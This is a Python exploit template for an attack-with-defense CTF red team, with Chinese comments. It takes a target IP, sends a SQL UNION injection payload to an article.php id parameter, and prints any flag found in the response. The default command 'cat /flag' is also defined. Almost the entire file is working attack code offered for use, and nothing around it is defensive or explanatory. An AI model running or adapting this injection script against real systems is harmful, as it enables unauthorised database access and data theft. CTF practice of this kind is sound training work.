#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AWD-Red 标准 PoC 示例模板 2: SQL 注入取旗利用
契约规范:
1. 接收 sys.argv[1] 作为目标 IP
2. 接收 sys.argv[2] 作为可选指令
3. 网络请求设置短超时
4. 抓取到 Flag 直接输出到标准输出
"""

import sys
import os
import urllib.request
import urllib.parse
import re

TIMEOUT = 2.0

def exploit(target: str, _cmd: str):
    if ":" in target:
        host, port = target.split(":", 1)
    else:
        host, port = target, "80"

    # 构造 SQL 联合查询注入 URL
    sql_payload = "1' UNION SELECT 1,flag,3 FROM flag-- "
    url = f"http://{host}:{port}/article.php?id=" + urllib.parse.quote(sql_payload)

    req = urllib.request.Request(
        url,
        headers={"User-Agent": "Mozilla/5.0 (AWD-Red SQLi Exploit)"}
    )

    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            text = resp.read().decode("utf-8", errors="ignore")
            m = re.search(r'(?:flag|FLAG)\{[a-zA-Z0-9_\-+=/]{6,128}\}', text)
            if m:
                print(m.group(0))
                return True
    except Exception:
        pass
    return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip[:port]> [flag_cmd]")
        sys.exit(1)

    target_ip = sys.argv[1]
    cmd = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("GET_FLAG_CMD", "cat /flag")
    
    success = exploit(target_ip, cmd)
    sys.exit(0 if success else 1)
